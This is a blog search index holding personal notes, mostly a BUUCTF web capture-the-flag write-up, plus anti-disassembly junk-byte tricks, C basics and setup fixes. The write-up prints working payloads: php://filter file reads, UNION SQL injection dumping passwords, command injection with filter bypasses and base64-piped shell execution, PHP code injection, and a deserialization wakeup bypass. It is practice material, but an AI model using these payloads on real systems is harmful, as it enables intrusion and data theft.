<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>èŠ±æŒ‡ä»¤å­¦ä¹ </title>
    <url>/2021/05/31/%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="ç¼–å†™èŠ±æŒ‡ä»¤"><a href="#ç¼–å†™èŠ±æŒ‡ä»¤" class="headerlink" title="ç¼–å†™èŠ±æŒ‡ä»¤"></a>ç¼–å†™èŠ±æŒ‡ä»¤</h3><p>å¦‚æœæˆ‘ä»¬åœ¨å†™ç¨‹åºçš„æ—¶å€™åµŒå…¥_asm _emit 0E9ï¼Œåç¼–è¯‘å™¨å°±ä¼šæŠŠä¸‹ä¸€æ¡æŒ‡ä»¤å½“åšåœ°å€æ•°æ®ï¼Œä¸ç®¡ä¸‹ä¸€æ¡æŒ‡ä»¤å®é™…ä¸Šçš„å››ä¸ªå­—èŠ‚æ˜¯åœ°å€æ•°æ®è¿˜æ˜¯æ“ä½œæŒ‡ä»¤ã€‚</p>
<p>winä¸‹ï¼š</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="variable">__asm</span> &#123; </span><br><span class="line">    <span class="variable">_emit</span> <span class="number">075</span>h    <span class="meta">#jmp $+4</span></span><br><span class="line">    <span class="variable">_emit</span> <span class="number">2</span>h</span><br><span class="line">    <span class="variable">_emit</span> <span class="number">0</span>E9h</span><br><span class="line">    <span class="variable">_emit</span> <span class="number">0</span>EDh</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Linuxä¸‹ï¼š</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">asm __volatile__ (<span class="string">".byte 0x75"</span>)<span class="comment">;</span></span><br><span class="line">asm __volatile__ (<span class="string">".byte 0x2"</span>)<span class="comment">;</span></span><br><span class="line">asm __volatile__ (<span class="string">".byte 0xe9"</span>)<span class="comment">;</span></span><br><span class="line">asm __volatile__ (<span class="string">".byte 0xed"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢åµŒå…¥çš„4å­—èŠ‚æ•°æ®å³å¯ä½¿å¾—ç¨‹åºåæ±‡ç¼–åç¼–è¯‘å‡ºé”™ï¼Œæ³¨æ„è¿™é‡Œçš„75æ˜¯jnzçš„æœºå™¨ç ï¼Œæ‰€ä»¥è¦æ±‚ç¨‹åºæ‰§è¡Œåˆ°è¿™é‡Œæ—¶Zflag=0ã€‚</p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
        <category>é€†å‘</category>
      </categories>
      <tags>
        <tag>é€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>CåŸºç¡€è¡¥å……</title>
    <url>/2021/05/31/C%E5%9F%BA%E7%A1%80%E8%A1%A5%E5%85%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ä»é›¶å¼€å§‹ï¼Œæ³¨é‡åŸºç¡€ï¼Œå¿ƒæ— æ—éª›ã€‚</p>
<h1 id="åŸºæœ¬ç±»å‹"><a href="#åŸºæœ¬ç±»å‹" class="headerlink" title="åŸºæœ¬ç±»å‹"></a>åŸºæœ¬ç±»å‹</h1><p><img src="/2021/05/31/CåŸºç¡€è¡¥å……/image-20200729180415547.png" alt="image-20200729180415547"></p>
<h2 id="æº¢å‡º"><a href="#æº¢å‡º" class="headerlink" title="æº¢å‡º"></a>æº¢å‡º</h2><p>ä½¿ç”¨Cè¯­è¨€çš„å®å¯ä»¥å¾—åˆ°å„ç±»å‹çš„æœ€å¤§å€¼ï¼Œè¦åŒ…å«limits.håº“æ–‡ä»¶ã€‚</p>
<p>æµ®ç‚¹æ•°çš„æœ€å¤§å€¼è¦åŒ…å«float.hã€‚</p>
<p>math.håº“æœ‰æ•°å­¦å…¬å¼ã€‚</p>
<h2 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h2><p>scanfé‡åˆ°ç©ºç™½åœæ­¢è¯»å–ã€‚</p>
<p>sizeofè®¡ç®—å­˜å‚¨å•å…ƒï¼ŒåŒ…æ‹¬<code>\0</code>ï¼Œstrlenè®¡ç®—å®é™…é•¿åº¦ã€‚</p>
<p>å¯¹äºç±»å‹éœ€è¦sizeof(char),å¯¹äºç‰¹å®šé‡sizeof nameå³å¯ï¼Œå»ºè®®éƒ½åŠ åœ†æ‹¬å·ï¼Œä¸ä¼šå‡ºé”™ã€‚</p>
<p>consté™å®šç¬¦ä¿®é¥°çš„æ˜¯å˜é‡ï¼Œä¸æ˜¯å¸¸é‡ï¼Œåªæ˜¯å˜é‡åªè¯»ï¼Œä¸å¯æ›´æ”¹ã€‚</p>
<p><img src="/2021/05/31/CåŸºç¡€è¡¥å……/image-20200729181326723.png" alt="image-20200729181326723"></p>
<p><img src="/2021/05/31/CåŸºç¡€è¡¥å……/image-20200729231246876.png" alt="image-20200729231246876"></p>
<p><img src="/2021/05/31/CåŸºç¡€è¡¥å……/image-20200729231610571.png" alt="image-20200729231610571"></p>
<p><img src="/2021/05/31/CåŸºç¡€è¡¥å……/image-20200729231628042.png" alt="image-20200729231628042"></p>
<h1 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h1><p>c99è§„å®šå¯ä»¥æŒ‡å®šåˆå§‹åŒ–å…ƒç´ ï¼Œå¦‚ï¼š</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> a[<span class="number">6</span>] = &#123;[<span class="number">5</span>] = <span class="number">111</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>åªéœ€è¦åˆå§‹åŒ–ä¸€ä¸ªå…ƒç´ ï¼Œå…¶ä»–æœªåˆå§‹åŒ–å…ƒç´ ä¼šè¢«è‡ªåŠ¨åˆå§‹åŒ–ä¸º0ã€‚</p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>æŠ¥é”™ã€è¸©å‘è®°å½•</title>
    <url>/2021/05/31/%E6%8A%A5%E9%94%99%E3%80%81%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="IDA-python-æ’ä»¶å®‰è£…"><a href="#IDA-python-æ’ä»¶å®‰è£…" class="headerlink" title="IDA-python æ’ä»¶å®‰è£…"></a>IDA-python æ’ä»¶å®‰è£…</h1><ul>
<li>yara-pythonå®‰è£…å‘½ä»¤ <code>python2 -m pip install yara-python==3.11.0</code>,å› ä¸ºåªæœ‰3.11çš„è½®å­æ”¯æŒpython2çš„è€Œä¸”æ˜¯windowsçš„ç‰ˆæœ¬ã€‚</li>
</ul>
<h1 id="VScodeå’ŒWSLæ­å»ºCå¼€å‘ç¯å¢ƒ"><a href="#VScodeå’ŒWSLæ­å»ºCå¼€å‘ç¯å¢ƒ" class="headerlink" title="VScodeå’ŒWSLæ­å»ºCå¼€å‘ç¯å¢ƒ"></a>VScodeå’ŒWSLæ­å»ºCå¼€å‘ç¯å¢ƒ</h1><ol>
<li><p>é¦–å…ˆå®‰è£…wslï¼Œå¾®è½¯å•†åº—å°±æœ‰ã€‚</p>
</li>
<li><p>å®‰è£…VScodeã€‚</p>
</li>
<li><p>æ¢æº</p>
<p><code>sudo vim /etc/apt/source.list</code></p>
</li>
<li><p>æ›´æ–°ubuntuè½¯ä»¶ï¼Œ<code>sudo apt-get update</code></p>
</li>
<li><p>å®‰è£…gccï¼Œgdbç­‰å·¥å…·</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">sudo apt <span class="keyword">install </span><span class="keyword">build-essential</span></span><br><span class="line"><span class="keyword">sudo </span>apt <span class="keyword">install </span>gdb</span><br></pre></td></tr></table></figure>
</li>
<li><p>åœ¨VScodeä¸­å®‰è£…wslæ‰©å±•æ’ä»¶ã€‚</p>
</li>
<li><p>åœ¨VScodeä¸­å®‰è£…C/C++æ’ä»¶ã€‚</p>
</li>
<li><p>å®‰è£…code runneræ’ä»¶ã€‚</p>
</li>
<li><p>è¦å°†VScodeçš„ç›®å½•binæ·»åŠ åˆ°ç¯å¢ƒå˜é‡</p>
</li>
<li><p>code runneræ’ä»¶ä¸­æœ‰run in terminal</p>
</li>
<li><p>è®¾ç½®æ–‡ä»¶æ‰§è¡Œå‘½ä»¤ï¼Œæ–‡ä»¶ç”Ÿæˆç›®å½•ï¼Œåœ¨code runneræ’ä»¶çš„executor mapä¸­è®¾ç½®ã€‚</p>
</li>
</ol>
<h1 id="Terminal"><a href="#Terminal" class="headerlink" title="Terminal"></a>Terminal</h1><ol>
<li><p>è®¾ç½®å³é”®èœå•</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line"> reg.exe add "HKEY_CLASSES_ROOT<span class="symbol">\D</span>irectory<span class="symbol">\B</span>ackground<span class="symbol">\s</span>hell<span class="symbol">\w</span>t" /f /ve /d "Terminal"</span><br><span class="line"> reg.exe add "HKEY_CLASSES_ROOT<span class="symbol">\D</span>irectory<span class="symbol">\B</span>ackground<span class="symbol">\s</span>hell<span class="symbol">\w</span>t" /f /v "Icon" /t REG_EXPAND_SZ /d "<span class="symbol">\"</span>C:<span class="symbol">\U</span>sers<span class="symbol">\S</span>1lenc3<span class="symbol">\P</span>ictures<span class="symbol">\S</span>aved Pictures<span class="symbol">\t</span>erminal.ico""</span><br><span class="line"></span><br><span class="line"> reg.exe add "HKEY_CLASSES_ROOT<span class="symbol">\D</span>irectory<span class="symbol">\B</span>ackground<span class="symbol">\s</span>hell<span class="symbol">\w</span>t<span class="symbol">\c</span>ommand" /f /ve /t REG_EXPAND_SZ /d "<span class="symbol">\"</span><span class="variable">%LOCALAPPDATA%</span><span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indowsApps<span class="symbol">\w</span>t.exe<span class="symbol">\"</span>"</span><br><span class="line"></span><br><span class="line"> pause</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h1><figure class="highlight q"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install -y build-essential libssl-<span class="built_in">dev</span> zlib1g-<span class="built_in">dev</span> libbz2-<span class="built_in">dev</span> \</span><br><span class="line">libreadline-<span class="built_in">dev</span> libsqlite3-<span class="built_in">dev</span> wget curl llvm libncurses5-<span class="built_in">dev</span> libncursesw5-<span class="built_in">dev</span> \</span><br><span class="line">xz-utils tk-<span class="built_in">dev</span> libffi-<span class="built_in">dev</span> liblzma-<span class="built_in">dev</span> python-openssl git</span><br></pre></td></tr></table></figure>

<p>libc6-devä¾èµ–é—®é¢˜:</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">å®‰è£…è½¯ä»¶æŠ¥é”™ï¼š</span><br><span class="line"></span><br><span class="line">ä¸‹åˆ—è½¯ä»¶åŒ…æœ‰æœªæ»¡è¶³çš„ä¾èµ–å…³ç³»ï¼š</span><br><span class="line"> libc6-dev : ç ´å: libgcc<span class="number">-9</span>-dev (&lt; <span class="number">9.3</span><span class="number">.0</span><span class="number">-5</span>~) ä½†æ˜¯ <span class="number">9.2</span><span class="number">.1</span><span class="number">-19</span> æ­£è¦è¢«å®‰è£…</span><br><span class="line">E: é”™è¯¯ï¼ŒpkgProblemResolver::Resolve å‘ç”Ÿæ•…éšœï¼Œè¿™å¯èƒ½æ˜¯æœ‰è½¯ä»¶åŒ…è¢«è¦æ±‚ä¿æŒç°çŠ¶çš„ç¼˜æ•…ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è§£å†³ï¼š</span><br><span class="line"></span><br><span class="line">sudo apt install gcc<span class="number">-9</span>-base</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç¬”è®°</category>
        <category>æ—¥å¸¸è®°å½•</category>
      </categories>
      <tags>
        <tag>è®°å½•</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-web-1</title>
    <url>/2021/05/31/buuctf-web-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h1><p><img src="/2021/05/31/buuctf-web-1/image-20201109115411137.png" alt="image-20201109115411137"></p>
<p>æŸ¥çœ‹æºä»£ç ï¼š</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109115428125.png" alt="image-20201109115428125"></p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109115438916.png" alt="image-20201109115438916"></p>
<p>ç‚¹secretï¼Œä»€ä¹ˆéƒ½æ²¡å‘ç°ï¼Œä½†æ˜¯action.phpå˜ä¸ºäº†end.phpï¼Œåº”è¯¥æœ‰é‡å®šå‘ï¼ŒæŠ“åŒ…çœ‹çœ‹ï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109115520854.png" alt="image-20201109115520854"></p>
<p>ç„¶åè®¿é—®è¿™ä¸ªé¡µé¢ï¼Œå¾—åˆ°æºç ã€‚</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109115541874.png" alt="image-20201109115541874"></p>
<p>æƒ³åˆ°å¯ä»¥é€šè¿‡ä¼ªåè®®è¯»å–flagã€‚</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">secr3t.php?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>å°†å¾—åˆ°çš„base64ç¼–ç è¿›è¡Œè§£ç ï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109115730608.png" alt="image-20201109115730608"></p>
<h1 id="Include1"><a href="#Include1" class="headerlink" title="Include1"></a>Include1</h1><p>æ¯”ä¸Šä¸€ä¸ªé¢˜ç®€å•ï¼ŒåŒæ ·ä¼ªåè®®è¯»å–flag.php</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/31/buuctf-web-1/image-20201109120025091.png" alt="image-20201109120025091"></p>
<h1 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h1><figure class="highlight capnproto"><table><tr><td class="code"><pre><span class="line">' <span class="keyword">union</span> select <span class="number">1</span>,schema_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>![image-20201109120759230]buuctf-web-1/image-20201109120759230.png)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/31/buuctf-web-1/image-20201109121016802.png" alt="image-20201109121016802"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'geek'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/31/buuctf-web-1/image-20201109121306743.png" alt="image-20201109121306743"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'l0ve1ysq1'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/31/buuctf-web-1/image-20201109121514689.png" alt="image-20201109121514689"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> l0ve1ysq1)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/31/buuctf-web-1/image-20201109122141591.png" alt="image-20201109122141591"></p>
<h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p>tornadoæ¨¡æ¿æ³¨å…¥ï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109142438560.png" alt="image-20201109142438560"></p>
<p>æ ¹æ®æç¤ºï¼Œéœ€è¦æ–‡ä»¶åå’Œcookie_secret</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109142500146.png" alt="image-20201109142500146"></p>
<p>renderæ¸²æŸ“ï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109142516300.png" alt="image-20201109142516300"></p>
<p>æ‰¾åˆ°äº†æ–‡ä»¶åï¼Œç„¶åå°±éœ€è¦hashå€¼äº†ï¼Œ</p>
<p>çŒœæµ‹å­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œæ‰¾åˆ°è¾“å…¥ç‚¹ã€‚</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109142636807.png" alt="image-20201109142636807"></p>
<p>è¿™é‡Œæœ‰ç”¨æˆ·è¾“å…¥ï¼Œç®€å•è¯•è¯•ã€‚</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109142700008.png" alt="image-20201109142700008"></p>
<p>æŸ¥é˜…èµ„æ–™ï¼Œæ‰¾åˆ° handler.settings å±æ€§ï¼Œè¯•è¯•çœ‹ã€‚</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109142753280.png" alt="image-20201109142753280"></p>
<p>ç„¶åè¿›è¡ŒåŠ å¯†ï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109142937036.png" alt="image-20201109142937036"></p>
<h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p><img src="/2021/05/31/buuctf-web-1/image-20201109193848992.png" alt="image-20201109193848992"></p>
<p>pingå‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œlinuxå‘½ä»¤ï¼Œè¿™æ˜¯ä¸€ä¸ªrce</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109193917208.png" alt="image-20201109193917208"></p>
<p>ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109193943923.png" alt="image-20201109193943923"></p>
<p>ç»•è¿‡ç©ºæ ¼çš„æ–¹æ³•ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">cat flag.txt</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat<span class="variable">$IFS</span>$<span class="number">9</span>flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure>

<p>ä¸€äº›å­—ç¬¦ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œåªèƒ½ç”¨è¿™ç§ç»•è¿‡ï¼š</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109194054925.png" alt="image-20201109194054925"></p>
<p>ä¼°è®¡flagè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬è¯»å–indexè¯•è¯•ã€‚</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201109194127576.png" alt="image-20201109194127576"></p>
<p>å‘ç°è¿‡æ»¤äº†å¥½å¤šï¼Œflagè´ªå©ªåŒ¹é…äº†ï¼Œè¿™å¯å’‹åŠã€‚ã€‚ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;cat$IFS$<span class="number">9</span>`ls`</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…shï¼Œbase64åŠ å¯†çš„æ–¹å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span><span class="variable">$IFS</span><span class="variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="variable">$IFS</span><span class="variable">$1</span>-d|sh</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/31/buuctf-web-1/image-20201109194602514.png" alt="image-20201109194602514"></p>
<h1 id="Easy-Calc1"><a href="#Easy-Calc1" class="headerlink" title="Easy Calc1"></a>Easy Calc1</h1><p>æºç æ³„éœ²ï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201110220526310.png" alt="image-20201110220526310"></p>
<p>ç„¶åå‘ç°å­—ç¬¦è¢«è¿‡æ»¤äº†ï¼Œä½¿ç”¨phpè§£æå­—ç¬¦ä¸²çš„ç‰¹æ€§ç»•è¿‡ï¼Œé—®å·åè¾¹åŠ ç©ºæ ¼ã€‚</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201110220712407.png" alt="image-20201110220712407"></p>
<p>è¯»å–ç›®å½•ï¼Œä½†æ˜¯å•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œä½¿ç”¨å¦‚ä¸‹payloadï¼š</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201110220951863.png" alt="image-20201110220951863"></p>
<p>è¯»å–f1aggæ–‡ä»¶ï¼Œ</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">? num=print_r(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)));</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/31/buuctf-web-1/image-20201110221327620.png" alt="image-20201110221327620"></p>
<h1 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h1><p>payloadï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">123|cat <span class="built_in">..</span>/<span class="built_in">..</span>/<span class="built_in">..</span>/<span class="built_in">..</span>/flag</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/31/buuctf-web-1/image-20201111173214101.png" alt="image-20201111173214101"></p>
<h1 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h1><p><img src="/2021/05/31/buuctf-web-1/image-20201112152241674.png" alt="image-20201112152241674"></p>
<p>è¿æ¥ä¸€å¥è¯é©¬ï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201112152304644.png" alt="image-20201112152304644"></p>
<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>é€šè¿‡å°è¯•ï¼Œæ‰¾åˆ°äº†<code>www.zip</code>å¤‡ä»½ç›®å½•ï¼Œå®¡è®¡æºç ã€‚</p>
<p>ååºåˆ—åŒ–å­¦ä¹ ï¼š<a href="https://www.jianshu.com/p/1d2c65601d2a" target="_blank" rel="noopener">https://www.jianshu.com/p/1d2c65601d2a</a></p>
<p>è¾“å‡ºflagçš„æ˜¯class.phpï¼š</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201113214722442.png" alt="image-20201113214722442"></p>
<p><code>unserialize()</code> ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª <code>__wakeup()</code> æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ <code>__wakeup</code> æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</p>
<p>ç»•è¿‡wakeupæ–¹æ³•ï¼š</p>
<p><strong>å½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç›®æ—¶å¯ç»•è¿‡wakeupæ–¹æ³•(CVE-2016-7124)</strong></p>
<p>æ‰€ä»¥å¯ä»¥æ„é€ expï¼š</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201118212526526.png" alt="image-20201118212526526"></p>
<p>å°†å±æ€§å€¼2æ”¹ä¸ºå¤§äº2çš„å°±å¯ä»¥äº†ã€‚å› ä¸ºæœ‰ä¸å¯æ‰“å°å­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯¹\0è¿›è¡Œurlç¼–ç ã€‚</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201118213222658.png" alt="image-20201118213222658"></p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">index.php?select=O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00username"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00password"</span>;<span class="string">i:</span><span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h1><p>è®¿é—®secret.phpï¼š</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201118214105813.png" alt="image-20201118214105813"></p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201118214112544.png" alt="image-20201118214112544"></p>
<p>æˆ‘ä»¬è®¾ç½®refererè¯•è¯•ï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201118214151473.png" alt="image-20201118214151473"></p>
<p>å†è®¾ç½®user-agentï¼š</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201118214306684.png" alt="image-20201118214306684"></p>
<p>æœ¬åœ°åªè¯»ï¼Œä¼ªé€ ipï¼š</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201118214420371.png" alt="image-20201118214420371"></p>
<p>æ‹¿åˆ°flag</p>
<p>httpè¯·æ±‚åŒ…ï¼š</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">GET <span class="regexp">/Secret.php HTTP/</span><span class="number">1.1</span></span><br><span class="line"><span class="string">Host:</span> node3.buuoj.<span class="string">cn:</span><span class="number">26085</span></span><br><span class="line">Proxy-<span class="string">Connection:</span> keep-alive</span><br><span class="line"><span class="string">Referer:</span> <span class="string">https:</span><span class="comment">//www.Sycsecret.com</span></span><br><span class="line">Cache-<span class="string">Control:</span> max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-<span class="string">Requests:</span> <span class="number">1</span></span><br><span class="line">User-<span class="string">Agent:</span> Syclover</span><br><span class="line">X-Forwarded-<span class="string">For:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="string">Accept:</span> text<span class="regexp">/html,application/</span>xhtml+xml,application<span class="regexp">/xml;q=0.9,image/</span>webp,image<span class="regexp">/apng,*/</span>*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.9</span></span><br><span class="line">Accept-<span class="string">Encoding:</span> gzip, deflate</span><br><span class="line">Accept-<span class="string">Language:</span> zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line"><span class="string">Cookie:</span> UM_distinctid=<span class="number">175</span>b7bc59d4266<span class="number">-032275</span>eb541e94<span class="number">-4353760</span><span class="number">-144000</span><span class="number">-175</span>b7bc59d5358</span><br></pre></td></tr></table></figure>

<h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>è§£æ³•å¾ˆå¤šï¼Œå› ä¸ºä»å¤´åˆ°å°¾éƒ½æ˜¯ç…§ç€wpåšçš„ï¼Œè´´ä¸€ç¯‡wpå§ã€‚</p>
<p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/100733581</a></p>
<h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><p>ä¸Šä¼ æ–‡ä»¶ï¼ŒæŠ“åŒ…ï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201130163901279.png" alt="image-20201130163901279"></p>
<p>è¿”å›</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201130163923032.png" alt="image-20201130163923032"></p>
<p>æ›´æ”¹æ–‡ä»¶ç±»å‹å¤´ï¼š</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201130164011530.png" alt="image-20201130164011530"></p>
<p>è¿”å›</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201130164029780.png" alt="image-20201130164029780"></p>
<p>æ›´æ”¹åç¼€åç§°ï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201130164258904.png" alt="image-20201130164258904"></p>
<p>è¿”å›</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201130164320280.png" alt="image-20201130164320280"></p>
<p>è¿‡æ»¤äº†<code>&lt;?</code>ã€‚</p>
